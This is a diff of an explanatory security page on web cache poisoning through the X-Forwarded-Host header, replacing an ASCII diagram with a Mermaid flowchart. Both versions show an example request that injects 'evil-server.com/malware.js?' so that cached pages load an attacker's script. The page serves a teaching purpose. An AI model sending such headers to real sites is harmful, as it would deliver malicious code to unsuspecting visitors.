@@ -17,30 +17,18 @@ For example, if a user goes to `https://www.store.com`, the Cloudflare proxy mig
 If a caching layer sits in front of the application, and the caching layer treats `X-Forwarded-Host` as an **Unkeyed Input** (meaning it ignores it when creating the cache fingerprint), an attacker can poison the cache. The attacker injects `X-Forwarded-Host: evil.com`. The backend generates HTML pointing to `evil.com`. The cache saves this HTML under the normal URL path. Legitimate users are then served the poisoned HTML.
 
 ## ASCII Diagram
-```text
-================================================================================
-                    POISONING VIA X-FORWARDED-HOST
-================================================================================
+```mermaid
+flowchart TD
+    Attacker["1. Attacker Sends Payload <br/> GET /login HTTP/1.1 <br/> Host: target.com <br/> X-Forwarded-Host: evil-server.com/malware.js?"]
+    Back["2. Backend Generates HTML <br/> Backend framework reads X-Forwarded-Host to build the analytics script tag. <br/> &lt;script src='https://evil-server.com/malware.js?/analytics/tracking.js'&gt;&lt;/script&gt;"]
+    Cache["3. Cache Saves the Response <br/> Cache stores the HTML under Cache Key: GET /login | target.com"]
+    Victim["4. Victim Requests the Page <br/> GET /login HTTP/1.1 <br/> Host: target.com"]
+    Result["5. Cache Serves Poisoned HTML <br/> Victim's browser parses the HTML and downloads malware.js from the attacker!"]
 
-[1. Attacker Sends Payload]
-GET /login HTTP/1.1
-Host: target.com
-X-Forwarded-Host: evil-server.com/malware.js?
-
-[2. Backend Generates HTML]
-Backend framework reads X-Forwarded-Host to build the analytics script tag.
-<script src="https://evil-server.com/malware.js?/analytics/tracking.js"></script>
-
-[3. Cache Saves the Response]
-Cache stores the HTML under Cache Key: GET /login | target.com
-
-[4. Victim Requests the Page]
-GET /login HTTP/1.1
-Host: target.com
-
-[5. Cache Serves Poisoned HTML]
-Victim's browser parses the HTML and downloads malware.js from the attacker!
-================================================================================
+    Attacker --> Back
+    Back --> Cache
+    Victim --> Result
+    Cache -.-> Result
 ```
 
 ## How to Find It
